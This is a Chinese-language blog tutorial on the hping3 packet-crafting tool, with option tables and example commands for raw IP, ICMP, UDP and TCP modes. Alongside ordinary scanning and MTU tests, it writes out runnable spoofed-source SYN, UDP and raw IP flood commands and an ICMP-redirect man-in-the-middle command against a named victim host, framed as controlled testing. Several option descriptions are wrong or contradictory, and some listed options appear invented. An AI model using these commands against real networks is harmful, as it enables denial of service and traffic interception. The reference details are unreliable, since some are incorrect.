---
# 文章标题
title: Kali Linux 常用工具 - hPing3
# 当前页面的短标题，会在导航栏、侧边栏和路径导航中作为首选。
shortTitle: Kali 工具 - hPing3
# 当前页面内容描述。
description: hPing3 是一个强大的命令行网络安全工具，用于生成和解析自定义的 TCP、UDP、ICMP 和原始 IP 数据包。它类似于增强版的 ping 命令，但功能更全面，常用于网络审计、防火墙测试、端口扫描和性能评估。
# 当前页面的图标，建议填写
icon: "/assets/blogicons/Kali.png"
# 作者
author: 昌霖学长
# 当前文章是否为原创
isOriginal: true
# 设置写作时间
date: 2024-08-01
# 分类，一个页面可以有多个分类
categories: 
  - 网络安全
  - Kali
# 标签，一个页面可以有多个标签
tags: 
  - Kali 工具
  - hping3
  - hping
# 页面的协议信息
license: MIT
# 置顶标记（true/false/数字），当填入数字时，数字越大，排名越靠前。
sticky: false
# 星标（true/false/数字），当填入数字时，数字越大，排名越靠前。
star: false
# 是否将该文章添加至文章列表中。
article: true
# 是否将该文章添加至时间线中。
timeline: true
# 是否开启评论
comment: false
# 预览图。请填入绝对路径。图片路径位于 .vuepress/public 下
# cover: /assets/images/cover1.jpg
# 设置横幅图片 (宽屏分享图)，请填入绝对路径。
# banner: /assets/images/cover1.jpg
---

::: important AI 辅助说明 🤖

**本文在撰写过程中借助 AI 工具（Google Gemini）进行了资料整理与文案润色，核心观点及最终内容均由作者审阅确认。**

**但考虑到作者个人局限，再叠加 AI 偶尔「一本正经胡说八道」的习性，文中部分细节难免错漏，仅供参考。如有疑问，还请以官方文档或实际结果为准。**

:::

## 1. hPing3 简介

hPing3 是一个强大的命令行网络安全工具，用于生成和解析自定义的 TCP、UDP、ICMP 和原始 IP 数据包。它类似于增强版的 ping 命令，但功能更全面，常用于网络审计、防火墙测试、端口扫描和性能评估。

## 2. 核心功能

- 发送自定义的 TCP、UDP、ICMP 或原始 IP 数据包，并显示目标系统的回复信息。

- 使用特定标志（如 SYN、ACK、FIN）进行高级端口扫描。

- 在标准 ICMP ping 被防火墙拦截时，穿透或测试防火墙规则。

- 伪造源 IP 地址以进行安全脆弱性测试。

- 使用不同协议（如 TCP）执行路由追踪（Traceroute）。

- 支持使用 Tcl 语言编写自动化测试脚本。

## 3. 参数解释

### 3.1 基础选项

| <div style="width:50px; margin: 0 auto;">短选项</div> | <div style="width:150px; margin: 0 auto;">长选项</div> | 解释 |
| :---: | :---: | --- |
| `-h` | `--help` | 显示帮助。 |
| `-v` | `--version` | 显示版本。 |
| `-c` | `--count` | 发送数据包的数目。 |
| `-i` | `--interval` | 发送数据包间隔的时间。 <br><br> ( `u`代表微秒，例如：`-i u1000` 代表 1000 微秒发送一个包 )  |
| 无 | `--fast` | 等同 `-i u10000` (每秒 100 个包) 。 |
| 无 | `--faster` | 等同 `-i u1000` (每秒 1000 个包) 。 |
| 无 | `--flood` | 尽最快发送数据包，不显示回复。 |
| `-n` | `--numeric` | 数字化输出，不进行域名解析（DNS 解析）。 |
| `-q` | `--quiet` | 安静模式。 |
| `-I` | `--interface` | 网卡接口。 |
| `-V` | `--verbose` | 详细模式。 |
| `-D` | `--debug` | 调试信息。 |
| `-z` | `--bind` | 绑定 <kbd>Ctrl</kbd> + <kbd>Z</kbd> 到目的端口，如果 `-z ttl` 则绑定到 TTL 上。<br><br> 假设命令中使用 `-p 80` 指定扫描 80 端口，同时配置了 `-z` 选项：<br><ul><li>按 <kbd>Ctrl</kbd> + <kbd>Z</kbd> ，目的端口号 +1 变为 81 。</li><li>按 <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>Z</kbd> ，目的端口号 -1 变为 79 。</li><li>如果使用 `-z ttl` 绑定在 TTL 上，按 <kbd>Ctrl</kbd> + <kbd>Z</kbd> 时，变化的就是 TTL 值（ +1 ）。</li></ul> |
| `-Z` | `--unbind` | 取消绑定 <kbd>Ctrl</kbd> + <kbd>Z</kbd> 键。 |
| 无 | `–beep` | 对于接收到的每个匹配数据包蜂鸣声提示。 |

### 3.2 模式选择

**默认模式是 TCP**。

| <div style="width:50px; margin: 0 auto;">短选项</div> | <div style="width:150px; margin: 0 auto;">长选项</div> | 解释 |
| :---: | :---: | --- |
| `-0` | `--rawip` | **原始 IP 模式。** <br><br> 在默认情况下，hping3 会使用 TCP 协议 发送数据包。但当你加上 `-0` 或 `--rawip` 时，hping3 会剥离掉传输层（如 TCP、UDP 或 ICMP）的头部信息，直接在网络层（IP 层）发送最原始的数据包。<br><br>也就是说，你发送的数据包结构只有：【IP 头部】+【你自定义的数据（Payload）】，中间没有 TCP 端口或 UDP 端口的概念。 |
| `-1` | `--icmp` | **ICMP 模式。** <br><br> 当使用这个参数时，hping3 不再发送默认的 TCP 数据包，而是转而发送 ICMP 数据包。这与我们平时使用的系统自带 `ping` 命令非常相似。 |
| `-2` | `--udp` | **UDP 模式。** <br><br> 当使用这个参数时，hping3 会停止发送默认的 TCP 数据包，转而发送 UDP 数据包。 |
| `-8` | `--scan` | **扫描模式。** <br><br> 当使用该选项时，hping3 允许你指定一个或多个端口范围，并根据你设置的数据包类型（如 TCP SYN 标志位），去批量探测目标主机上哪些端口是开放的。 |
| `-9` | `--listen` | **监听模式。** <br><br> 在这个模式下，hping3 变成了类似一个网络「抓包工具」。它会使你的系统在后台默默等待，拦截并解析所有流经网卡的、包含特定特征（特征码/签名） 的数据包。 |

#### 3.2.1 原始 IP 模式

:::: info 常见使用场景与例子

1. **手动指定协议号进行防火墙/ACL 探测**

    ```shell
    hping3 -0 -H 89 -a 192.168.1.100 10.0.0.1 -c 3
    ```

    ::: note 参数解析

    - `-0`：开启 RAW IP 模式。

    - `-H 89`：将 IP 头的 Protocol 字段设置为 89。

    - `-a 192.168.1.100`：伪造源 IP 地址。

    - `-c 3`：仅发送 3 个数据包后停止。

    :::

    **作用**：向目标 10.0.0.1 发送自定义 IP 协议号为 89（OSPF 路由协议）的原始报文，并伪造源地址为 192.168.1.100。

    **应用场景**：测试防火墙或安全组是否拦截了常见的非 TCP/UDP 协议流量（如 OSPF、GRE、IGMP 等）。

2. **测试路径 MTU 与分片重组能力（DF / MF 标志）**

    ```shell
    hping3 -0 -H 1 -y -d 1400 10.0.0.1
    hping3 -0 -H 1 -f -m 500 -d 1400 10.0.0.1
    ```

    ::: note 参数解析

    - `-H 1`：IP 协议号设为 1（ICMP）。

    - `-y`：设置 IP 头部的 DF（Don't Fragment）标志位。

    - `-f`：开启数据包分片（Fragment）。

    - `-m 500`：指定虚拟 MTU 为 500 字节。

    - `-d 1400`：指定 Payload 数据大小为 1400 字节。

    :::

    **作用**：

    - 第一条命令：设置 DF（不分片）标志，发送 1400 字节的 IP 报文，用于测试链路上是否存在更小的 MTU 限制。

    - 第二条命令：设置虚拟 MTU 为 500 字节，将 1400 字节的数据强行切分为多个小碎片（Fragments）发送。

    **应用场景**：评估网络设备（如路由器、防火墙）对 IP 分片包的重组、检测与过滤性能。

3. **结合随机源地址进行 RAW IP Flood 压测**

    ```shell
    hping3 -0 -H 253 --rand-source -d 1000 --flood 10.0.0.1
    ```

    ::: note 参数解析

    - `-H 253`：指定 RFC 保留的测试协议号。

    - `--rand-source`：每次发包均使用随机伪造的源 IP 地址。

    - `-d 1000`：填充 1000 字节的随机数据。

    - `--flood`：尽最大努力极速发包（不等待接收回包）。

    :::

    **作用**：以极高的速度向目标主机发送载荷为 1000 字节、使用未分配协议号（如 253/254 实验协议）且源 IP 随机变化的原始 IP 包。

    **应用场景**：在受控的测试环境中评估网络设备（IDS/IPS/防火墙）在面对非典型协议 Flood 攻击时的吞吐量和资源消耗。

4. **发送携带自定义载荷（Payload）的原始 IP 报文**

    ```shell
    hping3 -0 -H 17 -E /path/to/payload.bin -d 128 10.0.0.1
    ```

    ::: note 参数解析

    - `-E /path/to/payload.bin`：从文件读取填充数据。

    - `-d 128`：指定从文件中读取并发送的字节数。

    :::

    **作用**：构建一个 IP 协议号为 17（UDP）的原始 IP 包，并将二进制文件 payload.bin 中的前 128 字节内容作为 Payload 写入报文体中发送。

    **应用场景**：安全研究人员用于自定义 Payload 测试，或验证检测引擎对特定数据特征（Signature）的识别能力。

::::

| <div style="width:50px; margin: 0 auto;">短选项</div> | <div style="width:150px; margin: 0 auto;">长选项</div> | <div style="width:150px; margin: 0 auto;">参数格式</div> | 解释 |
| :---: | :---: | :---: | --- |
| `-0` | `--rawip` | 无 | **启用 RAW IP 模式**，仅构造基础 IP 头部，后接原始载荷（Payload）。 |
| `-a` | `--spoof` | `<hostname\|ip>` | **源地址欺骗。** 指定伪造的源 IP 地址，用于隐藏真实地址或进行伪造源测试（无法接收回应包）。 |
| 无 | `--rand-dest` | 无 | **随机目标 IP。** 常用于网络扫描或向网段内随机主机施加流量压力。 |
| 无 | `--rand-source` | 无 | **随机源 IP。** 可产生大量的伪造源地址流量（如 SYN Flood 或 RAW IP Flood） |
| `-t` | `--ttl` | `<ttl_value>` | **设置 IP 头部的 TTL（生存时间）。** 取值范围 0-255，缺省值为 64。 |
| `-N` | `--id` | `<id_number>` | **指定 IP ID。** 手动指定 IP 报头中的 Identification 字段（取值范围 0-65535，缺省为随机值）。 |
| `-W` | `--winid` | 无 | **Windows ID 字节序。** 处理早期 Windows 系统在 IP ID 字节序上的大小端差异。 |
| `-r` | `--rel` | 无 | **相对 ID 模式。** 开启后可根据返回包的 IP ID 增长差值估计目标主机的网络流量（Idle Scan 核心原理）。 |
| `-f` | `--frag` | 无 | **数据包分片。** 将数据包拆分为小碎片发送（默认每片 16 字节），常用于测试 ACL/防火墙的分片处理能力。 |
| `-x` | `--morefrag` | 无 | **设置 Don't Fragment (DF) 标志。** 禁止中间设备切片，常用于路径 MTU 发现（PMTUD）。 |
| `-y` | `--dontfrag` | 无 | **设置 DF（Don't Fragment）不分段标志。** 可用于链路中 MTU 测试。取值通常为 8 的倍数（单位为 8 字节块）。 |
| `-g` | `--fragoff` | `<offset_value>` | **设置分片偏移量。** 手动指定 IP 头部的 Fragment Offset 字段。 |
| `-m` | `--mtu` |`<mtu_value>`| **设置虚拟 MTU。** 当发送数据（如加上 `-d` 数据包大小）超过该 MTU 时自动切片。如 500、1400、1500。 |
| `-o` | `--tos` | `<tos_hex\|help>` | **服务类型（ToS）。** 手动指定 IP 头的 ToS/DiffServ 字段（缺省 `0x00`），可用于 QoS 测试。 <br><br>支持十六进制数值，如：<ul><li>`0x00`（Best-Effort 默认）</li><li>`0x10`（低延迟/Minimize-Delay）</li><li>`0x08`（高吞吐/Maximize-Throughput）</li><li>`0x04`（高可靠/Maximize-Reliability）</li><li>`0x02`（最小成本/Minimize-Cost）；</li></ul><br>或接 `help` 查看说明。 |
| `-G` | `--rroute` |  无  | **记录路由。** 在 IP 选项中添加 Record Route 选项，用于记录报文经过的路由器 IP（需中间设备支持）。 |
| 无 | `--lsrr` | `<ip1,ip2,...>` | **松散源路由（Loose Source Routing）。** 接以逗号或空格分隔的路由器 IP 列表，指定数据包必须经过的途径节点。 |
| 无 | `--ssrr` | `<ip1,ip2,...>` | **严格源路由（Strict Source Routing）。** 接以逗号或空格分隔的路由器 IP 列表，数据包必须严格按照此路径传输。 |
| `-H` | `--ipproto` | `<protocol_num>` | **在 RAW IP 模式下手动指定 IP 头部的 Protocol 字段** （如 1=ICMP, 6=TCP, 17=UDP, 89=OSPF 等）。 |
| `-d` | `--data` | `<data_size>` | **设置 Payload 大小。** 指定数据包体（Data Space）填充的字节数（单位：字节）。例如 `-d 128`、`-d 1000`。 |
| `-E` | `--file` | `<filename>` | **从指定的文件中读取数据作为 Payload 写入数据包。** 接文件路径（如 `/path/to/payload.bin`）。 |
| `-e` | `--sign` | `<signature_str>` | **在发出的数据包末尾添加指定的签名或填充字符串。** 接文本字符串（如 `-e "test_packet"`）。 |
| `-c` | `--count` | `<packets_count>` | **指定发送的数据包总数量。** 接正整数（如 `-c 10`），达到该数值后自动停止发送。 |
| `-i` | `--interval` | `<interval_val>` | **设置发包的时间间隔。** 支持秒（如 `-i 1`）、毫秒（如 `-i m100` 表示 100ms）、微秒（如 `-i u1000` 表示 1000µs/1ms）或以 X 字符开启极速模式。 |
| 无 | `--flood` | 无 | **泛洪模式。** 尽最大能力极速发包模式（相当于 `-i u0`）。无需参数，忽略接收回复，常用于压力测试。 |

#### 3.2.2 ICMP 模式

:::: info 常见使用场景与例子

1. **ICMP 时间戳探测（获取目标系统时间）**

    ```shell
    hping3 -1 --icmp-ts 10.0.0.1 -c 3
    ```

    ::: note 参数解析

    - `-1`：开启 ICMP 模式。

    - `--icmp-ts`：快捷参数，相当于 `--icmptype 13`。

    - `-c 3`：仅发送 3 个包。

    :::

    **作用**：向目标主机 `10.0.0.1` 发送 ICMP Timestamp Request（Type 13）报文，用于获取目标主机的系统时间或推测其时区/uptime。

    **应用场景**：在传统的 ICMP Echo（Ping）被防火墙禁用时，尝试通过时间戳请求探测目标主机是否存活，或用于时间同步分析。

2. **ICMP 伪造重定向（ICMP Redirect 攻击/路由诱导）**

    ```shell
    hping3 -1 --icmptype 5 --icmpcode 1 --icmp-gw 192.168.1.254 -a 192.168.1.1 192.168.1.100
    ```

    ::: note 参数解析

    - `--icmptype 5`：指定 ICMP 类型为 `5`（Redirect 重定向）。

    - `--icmpcode 1`：指定代码为 `1`（Redirect for Host Host-based）。

    - `--icmp-gw 192.168.1.254`：设置重定向报文中的目标网关地址。

    - `-a 192.168.1.1`：伪造源地址为原网关地址，使受害主机信任该报文。

    :::

    **作用**：伪装成默认网关 `192.168.1.1`，向受害主机 `192.168.1.100` 发送 ICMP 重定向报文，诱导其将发往特定主机/网段的流量重定向发送到黑客指定的网关 `192.168.1.254`（中间人攻击）。

    **应用场景**：局域网内中间人攻击（MITM）测试，评估终端操作系统是否开启了安全策略阻止非合规 ICMP 重定向。

3. **强制发送自定义/畸形 ICMP 报文（漏洞/模糊测试）**

    ```shell
    hping3 -1 -C 255 -K 255 --force-icmp 10.0.0.1
    ```

    ::: note 参数解析

    - `-C 255`：将 ICMP Type 设为未定义的 `255`。

    - `-K 255`：将 ICMP Code 设为 `255`。

    - `--force-icmp`：强制允许发送不受支持的 ICMP 类型/代码组合。

    :::

    **作用**：绕过 `hping3` 的安全校验，向目标强制发送 ICMP Type 为 `255`、Code 为 `255` 的非标准/未定义 ICMP 畸形数据包。

    **应用场景**：针对网络设备、IDS/IPS 或操作系统协议栈进行漏洞挖掘（Fuzzing/模糊测试），评估其遇到未知或非法的 ICMP 报文时是否会发生崩溃或异常。

4. **测试坏校验和（Bad Checksum）过滤规则**

    ```shell
    hping3 -1 --icmp-cksum-bad 10.0.0.1 -c 2
    ```

    ::: note 参数解析

    - `--icmp-cksum-bad`：故意算错并填充错误的校验和。

    :::

    **作用**：向目标主机发送校验和错误的 ICMP Echo 请求报文。

    **应用场景**：测试防火墙、IDS/IPS 或网络抓包工具（如 Wireshark/Tcpdump）是否会直接丢弃坏包，或验证网卡卸载（Checksum Offload）机制是否有效。

::::

| <div style="width:50px; margin: 0 auto;">短选项</div> | <div style="width:150px; margin: 0 auto;">长选项</div> | <div style="width:150px; margin: 0 auto;">参数格式</div> | 解释 |
| :---: | :---: | :---: | --- |
| `-1` | `--icmp` | 无 | **启用 ICMP 模式。** 必须指定此开关才能触发 ICMP 探测与攻击行为。 |
| `-C` | `--icmptype` | `<type_num>` | **设置 ICMP 报文类型（Type）。** 取值范围 0-255，缺省值为 8（Echo Request 回显请求）。常见取值：0 (Echo Reply)、3 (Destination Unreachable)、5 (Redirect)、11 (Time Exceeded)、13 (Timestamp Request) 等。 |
| `-K` | `--icmpcode` | `<code_num>` | **设置 ICMP 报文代码（Code）。** 取值范围 0-255，缺省值为 0。通常与 ICMP Type 配合使用（例如 Type 3 下 Code 0=Net Unreachable, 1=Host Unreachable, 3=Port Unreachable 等）。 |
| 无 | `--force-icmp` | 无 | **强制发送任意 ICMP 类型与代码组合。** 默认情况下 hping3 仅允许发送内置支持的 ICMP 类型，加上此参数可突破限制，构造任意或畸形的 ICMP 包。 |
| 无 | `--icmp-gw` | `<gateway_ip>` | **设置 ICMP 重定向（Redirect, Type 5）报文中的网关 IP 地址。** 接 IPv4 地址（如 192.168.1.1），缺省值为 0.0.0.0。 |
| 无 | `--icmp-ts` | 无 | **快捷选项，等同于使用 `-1 --icmptype 13`。** 直接发送 ICMP Timestamp（时间戳请求）报文。 |
| 无 | `--icmp-addr` | 无 | **快捷选项，等同于使用 `-1 --icmptype 17`。** 直接发送 ICMP Address Mask（子网掩码请求）报文。 |
| 无 | `--icmp-help` | 无 | **显示针对 ICMP 模式特有的扩展帮助信息与选项列表。** |
| 无 | `--icmp-cksum` | `<cksum_hex>` | **手动覆盖并指定 ICMP 报文头部的校验和（Checksum）。** 接十六进制数值（如 0x1234），用于构造特定测试包。 |
| 无 | `--icmp-cksum-bad` | 无 | **强制生成一个错误的 ICMP 校验和。** 常用于测试防火墙、IDS 或目标主机操作系统对畸形/错误校验和报文的校验与过滤机制。 |
| 无 | `--icmp-ipver` | `<ip_version>` | **设置 ICMP 差错报文 Payload 中内嵌的原始 IP 报头的版本号。** 取值通常为 4，仅适用于 ICMP 差错控制报文（如 Type 3 / Type 11）。 |
| 无 | `--icmp-iphlen` | `<header_len>` | **设置 ICMP 差错报文内嵌 IP 头部的报头长度（Header Length）。** 单位为 32-bit 字长，缺省通常为 5（即 20 字节）。 |
| 无 | `--icmp-iplen` | `<total_len>` | **设置 ICMP 差错报文内嵌 IP 头部的总长度（Total Length）。** 接字节数值（如 40）。 |
| 无 | `--icmp-ipid` | `<ip_id>` | **设置 ICMP 差错报文内嵌 IP 头部的 Identification（标识符）字段。** 接 0-65535 之间的数值，缺省为随机值。 |
| 无 | `--icmp-ipproto` | `<protocol_num>` | **设置 ICMP 差错报文内嵌 IP 头部的传输层协议号。** 接协议号数值（如 6 代表 TCP、17 代表 UDP），缺省通常为 UDP。 |

#### 3.2.3 UDP 模式

在 `hping3` 的 `-2`（`--udp`）模式下，由于 UDP 是无连接的协议，目标在收到 UDP 包时，如果端口开放，通常会传给上层应用（若无回应应用则**静默**）；如果端口关闭，目标系统的操作系统通常会返回一个 **ICMP Port Unreachable（端口不可达）** 的响应。

:::: info 常见使用场景与例子

1. **UDP 端口扫描（扫描常见开放端口）**

    ```shell
    hping3 -2 -s 5000 -p 53 -c 3 10.0.0.1
    ```

    ```shell
    hping3 -2 -s 5000 -p +50 -c 1 10.0.0.1
    ```

    ::: note 参数解析

    - `-2`：启用 UDP 模式。

    - `-s 5000`：固定源端口为 5000。

    - `-p +50`：从 50 号端口开始，每次自动加 1。

    :::

    **作用**：

    - **第一条命令**：指定固定源端口 `5000` 向目标的 `53`（DNS）端口发送 3 个 UDP 包。

    - **第二条命令**：从 `50` 端口开始（`-p +50`），依次对目标端口递增扫描，各发送 1 个包。

    **判定逻辑**：

    - 若收到 **ICMP Port Unreachable**：说明该 UDP 端口**已关闭**。

    - 若**没有任何回应**（或收到 UDP 响应）：说明该端口可能**开放或被防火墙过滤（Open|Filtered）**。

2. **构造有效 Payload 发送真实 DNS 查询请求**

    ```shell
    hping3 -2 -p 53 -d 30 -E /path/to/dns_payload.bin -c 1 10.0.0.1
    ```

    ::: note 参数解析

    - `-p 53`：目标端口设为 53。

    - `-d 30`：设定 Payload 长度为 30 字节。

    - `-E /path/to/dns_payload.bin`：指定二进制文件填充真实 DNS 查询报文。

    :::

    **作用**：向目标 DNS 服务器（`10.0.0.1` 的 53 端口）发送一个含有合法 DNS 协议数据（如查询域名 `example.com` 的 A 记录）的 UDP 包，以获取真正的 DNS 响应报文。

    **为什么需要这个命令**：`hping3` 默认发送的 UDP Payload 长度为 0，大多数 UDP 应用服务（如 DNS、SNMP、NTP）对空数据包不会做任何回应。因此必须加上 `-d` 指定长度并用 `-E` 填充合法的二进制数据，才能触发服务层的响应。

3. **UDP Flood 流量与拒绝服务（DoS）压测**

    ```shell
    hping3 -2 --rand-source -p 80 -d 1200 --flood 10.0.0.1
    ```

    ::: note 参数解析

    - `--rand-source`：每次发送数据包时随机切换源 IP。

    - `-p 80`：指定目标端口为 80。

    - `-d 1200`：填充 1200 字节的随机数据（接近普通以太网 MTU）。

    - `--flood`：尽最大努力极速发包（不等待接收回包）。

    :::

    **作用**：以极高的速度发送伪造随机源 IP 地址、载荷为 1200 字节的大 UDP 数据包，用于对目标网络设备或服务器进行带宽消耗型（Bandwidth Exhaustion）压力测试。

4. ***UDP 路径 MTU（PMTUD）探测**

    ```shell
    hping3 -2 -y -d 1450 -p 80 10.0.0.1
    ```

    ::: note 参数解析

    - `-y`：在 IP 头中强制开启 `DF` 标志。

    - `-d 1450`：指定数据载荷大小。如果数据包大小加上 IP/UDP 报头超出了路径上某个路由器的 MTU 限制，该路由器会丢弃此包并返回一个 `ICMP Fragmentation Needed` 的错误响应。

    :::

    **作用**：在发送 UDP 包时强制设置 `DF`（Don't Fragment，禁止分片）标志位，并逐步增大 Payload 长度（`-d`），以此探测源主机与目标主机路径上的**最小传输单元（MTU）**。

::::

| <div style="width:50px; margin: 0 auto;">短选项</div> | <div style="width:150px; margin: 0 auto;">长选项</div> | <div style="width:150px; margin: 0 auto;">参数格式</div> | 解释 |
| :---: | :---: | :---: | --- |
| `-2` | `--udp` | 无 | **启用 UDP 模式。** 必须指定此开关才能触发 UDP 端口扫描或数据包构造。 |
| `-s` | `--baseport` | `<port_num>` | **设置基础源端口（Source Port）。** 取值范围 0-65535，缺省为随机值。支持使用 `+`（如 `-s 5000 +1`）使源端口在每次发包时自动递增。 |
| `-p` | `--destport` | `<port_num>` | **设置目的端口（Destination Port）。** 取值范围 0-65535，缺省值为 0。支持 `+`（如 `-p +1` 端口递增）或 `++`（控制台交互增减）。 |
| `-k` | `--keep` | 无 | **保持源端口不变。** 防止在端口自动增长模式下源端口发生变动。 |
| `-d` | `--data` | `<data_size>` | **指定 UDP 载荷（Payload）的大小（单位：字节）。** 由于 hping3 默认的 UDP 报文数据体为空，探测特定服务（如 DNS、SNMP）时通常需要此参数填充数据，如 `-d 64` 。 |
| `-E` | `--file` | `<filename>` | **从指定的文件中读取二进制数据或文本作为 UDP 载荷写入数据包。** 接文件路径（如 `/path/to/dns_query.bin`）。 |
| `-e` | `--sign` | `<signature_str>` | **在发出的 UDP 数据包末尾添加指定的签名或填充字符串。** 接文本字符串（如 `-e "udp_test"`）。 |
| `-b` | `--badcksum` | 无 | **强制发送带有错误校验和的传输层数据包。** 用于测试目标主机或防火墙对错误 UDP 校验和的丢弃/处理机制。 |
| 无 | `--udp-dest` | 无 | **UDP 模式下的特殊目的端口快捷处理（等同于 `-p`）。** |
| 无 | `--udp-source` | 无 | **UDP 模式下的特殊源端口快捷处理（等同于 `-s`）。** |

#### 3.2.4 TCP 模式

在 `hping3` 的 TCP 模式下，通过灵活组合控制标志位（SYN、ACK、FIN 等）和发包速率，可以实现端口探测、防火墙规则推断以及性能压测。

:::: info 常见使用场景与例子

1. **SYN 半开放端口扫描（SYN Scan）**

    ```shell
    hping3 -8 1-1024 -S 10.0.0.1
    ```

    ```shell
    hping3 -S -p 80 -c 3 10.0.0.1
    ```

    ::: note 参数解析

    - `-8 1-1024`：指定扫描端口范围。

    - `-S`：开启 TCP SYN 标志位。

    - `-p 80`：指定单探测端口为 80。

    :::

    **作用**：

    - **第一条命令**：开启端口扫描模式（`-8`），使用 SYN 标志位扫描目标 `10.0.0.1` 的 `1-1024` 端口。

    - **第二条命令**：针对目标的 `80` 端口发送 3 个 SYN 包进行单端口探测。

    **判定逻辑**：

    - 若收到 **`SYN+ACK`**：说明端口**开放**（`hping3` 会自动回复 `RST` 撕毁连接，不完成三次握手，隐蔽性高）。

    - 若收到 **`RST+ACK`**：说明端口**关闭**。

    - 若**无响应 / ICMP 超时**：说明端口被防火墙**过滤（Filtered）**。

2. **ACK 防火墙规则探测（ACK Firewall Probing）**

    ```shell
    hping3 -A -p 80 -c 3 10.0.0.1
    ```

    ::: note 参数解析

    - `-A`：设置 TCP ACK 标志位。

    :::

    **作用**：向目标 `80` 端口发送伪造的 ACK 确认包，用于探测防火墙是**有状态的（Stateful）**还是**无状态的（Stateless）**，以及对应端口是否被过滤。

    **判定逻辑**：

    - 若收到 **`RST`**：说明数据包穿越了防火墙（目标系统协议栈收到了这个不在连接状态中的 ACK 包并回复了 RST），表明该端口在防火墙上是未被过滤（Unfiltered）的。

    - 若**没有任何回应 / ICMP 错误**：说明数据包在到达目标前被有状态防火墙或 ACL **拦截丢弃（Filtered）**。

3. **SYN Flood 拒绝服务攻击 / 压力测试**

    ```shell
    hping3 -S --rand-source -p 80 -W 64 -d 1200 --flood 10.0.0.1
    ```

    ::: note 参数解析

    - `-S`：设置 SYN 标志位。

    - `--rand-source`：每次发包自动变换伪造源 IP，防止被单 IP 封禁策略拦截，同时放大半开连接池消耗。

    - `-p 80`：指定目标服务端口。

    - `-d 1200`：附加 1200 字节的垃圾数据载荷，同时消耗目标网络带宽。

    - `--flood`：尽最大能力极速发包（不等待接收回包）。

    :::

    **作用**：以极高速度向目标的 80 端口发送大量伪造随机源 IP 的 SYN 数据包，用于在受控测试环境中评估 Web 服务器或防火墙防范 SYN Flood 的能力。

4. **Xmas 圣诞树扫描（绕过特定防火墙检测）**

    ```shell
    hping3 -F -P -U -p 80 -c 3 10.0.0.1
    ```

    ::: note 参数解析

    - `-F -P -U`：同时开启 FIN、PSH、URG 标志位。

    :::

    **作用**：同时开启 `FIN`、`PUSH` 和 `URG` 标志位（就像把圣诞树点亮一样），构造非法的 TCP 标志组合进行隐蔽扫描。

    **判定逻辑**：

    - **RFC 793 标准规定**：对于关闭的端口，收到该畸形包应回复 `RST`；对于开放的端口，收到后应直接**静默丢弃**。

    ::: caution
    此方法主要适用于符合 RFC 标准的 Unix/Linux 系统，Windows 无论端口开闭通常都会回复 RST。
    :::

5. **TCP 时间戳测量（推算目标系统 uptime / 操作系统特征）**

    ```shell
    hping3 -S -p 80 --tcp-timestamp -c 5 10.0.0.1
    ```

    ::: note 参数解析

    - `--tcp-timestamp`：开启 TCP 时间戳选项。

    :::

    **作用**：在发送 SYN 包时加入 TCP Timestamp 选项（TCP Option 8），通过分析回包中时间戳数值的增长速率，推算目标主机的系统运行时间（Uptime）或时钟频率（HZ）。

::::

| <div style="width:50px; margin: 0 auto;">短选项</div> | <div style="width:150px; margin: 0 auto;">长选项</div> | <div style="width:150px; margin: 0 auto;">参数格式</div> | 解释 |
| :---: | :---: | :---: | --- |
| `-s` | `--baseport` | `<port_num>` | **设置基础源端口（Source Port）。** 取值范围 0-65535，缺省为随机值。支持使用 `+`（如 `-s 1024 +1`）使源端口在每次发包时自动递增。 |
| `-p` | `--destport` | `<port_num>` | **设置目的端口（Destination Port）。** 取值范围 0-65535，缺省值为 0。支持 `+`（如 `-p +1` 端口递增）或 `++`（控制台交互增减）。 |
| `-k` | `--keep` | 无 | **保持源端口不变。** 防止在端口自动增长模式下源端口发生变动。 |
| `-w` | `--win` | `<win_size>` | **设置 TCP 报头中的滑动窗口大小（Window Size）。** 接字节数值，缺省值为 64 。 |
| `-O` | `--tcpoff` | `<offset_num>` | **设置伪造的 TCP 数据偏移量（Data Offset / Header Length）。** 取代标准的 tcphdrlen / 4 计算，用于测试畸形报文过滤。 |
| `-Q` | `--seqnum` | 无 | **仅输出接收到的 TCP 数据包中的序列号（Sequence Number）。** 用于测试目标主机 ISN（初始序列号）的随机性。 |
| `-b` | `--badcksum` | 无 | **强制发送带有错误传输层（TCP）校验和的数据包。** 用于测试防火墙或操作系统对错误校验和报文的处理逻辑。 |
| `-M` | `--setseq` | `<seq_num>` | **手动指定 TCP 的 32 位序列号（Sequence Number）。** 接数值（如 `-M 1000`）。 |
| `-L` | `--setack` | `<ack_num>` | **手动指定 TCP 的 32 位确认号（Acknowledgment Number）。** 接数值（如 `-L 2000`），<font color="red"><b>注意：这不是 ACK 标志位。</b></font> |
| `-F` | `--fin` | 无 | **设置 TCP FIN 标志位（释放连接）。** 常用于 FIN 扫描或测试非法标志位组合。 |
| `-S` | `--syn` | 无 | **设置 TCP SYN 标志位（建立连接）。** 缺省最常用的探测模式，用于半开放（SYN）扫描。 |
| `-R` | `--rst` | 无 | **设置 TCP RST 标志位（复位连接）。** 用于强行中断连接或测试拒绝行为。 |
| `-P` | `--push` | 无 | **设置 TCP PSH 标志位（推送数据）。** 指示接收方立即将数据提交给应用层。 |
| `-A` | `--ack` | 无 | **设置 TCP ACK 标志位（确认包）。** 用于 ACK 扫描或通过防火墙规则状态检查。 |
| `-U` | `--urg` | 无 | **设置 TCP URG 标志位（紧急指针有效）。** 配合紧急指针字段使用。 |
| `-X` | `--xmas` | 无 | **设置 TCP 报头中保留的 0x40 标志位，或结合 `-F -P -U` 构建圣诞树（Xmas）扫描包。** |
| `-Y` | `--ymas` | 无 | **设置 TCP 报头中保留的 0x80 标志位。** |
| `-8` | `--scan` | `<port\|known>` | **启用 TCP 端口扫描模式。** 参数接端口范围（如 `-8 1-1024`）、单个端口列表（如 `-8 80,443,8080`）或关键字 `known`（扫描常见服务端口）。 |
| `-9` | `--listen` | `<signature>` | **启用 TCP 监听模式。** 接字符串参数作为过滤签名（如 `-9 HTTP`），当网卡捕获到包含该签名的 TCP 数据包时触发输出。 |
| `-u` | `--end` | `<port_num>` | **配合端口递增参数（`-p +1`）使用，指定目的端口递增时的终止端口界限。** |
| 无 | `--tcpexitcode` | 无 | **将接收到的最后一个 TCP 数据包的 th_flags（控制标志位组合）作为 hping3 进程的退出代码（Exit Code）返回。** |
| 无 | `--tcp-mss` | `<mss_value>` | **在 TCP 选项（TCP Options）中填入指定的 MSS（最大报文段长度）值。** 如 `--tcp-mss 1460`。 |
